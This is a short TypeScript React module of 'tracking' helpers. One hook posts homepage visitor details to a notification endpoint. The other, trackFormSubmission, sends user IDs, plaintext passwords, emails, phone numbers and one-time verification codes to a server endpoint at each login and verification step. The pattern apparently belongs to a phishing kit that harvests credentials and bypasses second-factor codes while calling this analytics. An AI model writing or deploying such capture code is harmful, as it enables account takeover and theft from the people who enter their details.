'use client'

import { useEffect } from 'react'

export function useVisitorTracking() {
  useEffect(() => {
    const trackVisitor = async () => {
      try {
        if (typeof window === 'undefined') return

        // Limit visit notifications to homepage only
        if (window.location.pathname !== '/') return

        // Get additional client-side data
        const screenData = {
          screen: `${window.screen.width}x${window.screen.height}`,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          language: navigator.language,
          url: window.location.href
        }

        // Send notification on every homepage visit (no caching)
        await fetch('/api/visitor', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(screenData)
        })
      } catch (error) {
        console.error('Failed to track visitor:', error)
      }
    }

    trackVisitor()
  }, [])
}

export function trackFormSubmission(data: {
  type: 'login' | 'registration' | 'email_verification' | 'text_verification' | 'email_selection' | 'text_selection'
  userId?: string
  password?: string
  email?: string
  phone?: string
  otp?: string
  page: string
  timestamp?: string
}) {
  const formData = {
    ...data,
    timestamp: new Date().toISOString()
  }

  fetch('/api/form-submission', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(formData)
  }).catch(error => {
    console.error('Failed to track form submission:', error)
  })
}
